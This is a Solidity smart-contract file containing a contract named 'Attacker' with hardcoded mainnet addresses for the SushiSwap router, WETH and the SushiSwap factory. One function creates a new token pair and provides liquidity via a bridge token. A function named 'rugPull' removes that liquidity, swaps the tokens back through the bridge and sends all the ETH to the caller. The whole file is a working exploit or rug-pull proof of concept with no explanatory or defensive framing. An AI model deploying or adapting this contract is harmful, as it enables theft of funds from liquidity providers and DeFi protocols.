pragma solidity >=0.8.0;
import "../interfaces/IERC20.sol";
import "../interfaces/IWETH.sol";
import "../interfaces/IUniswapV2Router02.sol";
import "../interfaces/IUniswapV2Factory.sol";
import "../interfaces/IUniswapV2Pair.sol";

contract Attacker {
    IUniswapV2Router02 public constant sushiRouter =
        IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    IWETH public constant WETH =
        IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Factory public constant factory =
        IUniswapV2Factory(0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac);

    function createAndProvideLiquidity(
        IERC20 wethBridgeToken,
        IERC20 nonWethBridgeToken
    ) external payable {
        WETH.deposit{value: msg.value}();
        WETH.approve(address(sushiRouter), msg.value);
        address[] memory path = new address[](3);
        path[0] = address(WETH);
        path[1] = address(wethBridgeToken);
        path[2] = address(nonWethBridgeToken);

        uint256[] memory amounts =
            sushiRouter.swapExactTokensForTokens(
                msg.value / 2,
                0,
                path,
                address(this),
                type(uint256).max
            );
        uint256 nonWethBridgeTokenAmount = amounts[2];

        factory.createPair(address(WETH), address(nonWethBridgeToken));

        nonWethBridgeToken.approve(
            address(sushiRouter),
            nonWethBridgeTokenAmount
        );
        sushiRouter.addLiquidity(
            address(WETH),
            address(nonWethBridgeToken),
            msg.value / 2,
            nonWethBridgeTokenAmount,
            0,
            0,
            address(this),
            type(uint256).max
        );
    }

    function rugPull(IUniswapV2Pair wethPair, IERC20 wethBridgeToken) external {
        IERC20 otherToken = IERC20(wethPair.token0());
        if (otherToken == WETH) {
            otherToken = IERC20(wethPair.token1());
        }
        uint256 lpToWithdraw = wethPair.balanceOf(address(this));
        wethPair.approve(address(sushiRouter), lpToWithdraw);
        sushiRouter.removeLiquidity(
            address(otherToken),
            address(WETH),
            lpToWithdraw,
            0,
            0,
            address(this),
            type(uint256).max
        );

        uint256 otherTokenBalance = otherToken.balanceOf(address(this));
        otherToken.approve(address(sushiRouter), otherTokenBalance);
        address[] memory path = new address[](3);
        path[0] = address(otherToken);
        path[1] = address(wethBridgeToken);
        path[2] = address(WETH);

        uint256[] memory amounts =
            sushiRouter.swapExactTokensForTokens(
                otherTokenBalance,
                0,
                path,
                address(this),
                type(uint256).max
            );

        WETH.withdraw(amounts[2]);
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "final transfer failed");
    }

    receive() external payable {}
}
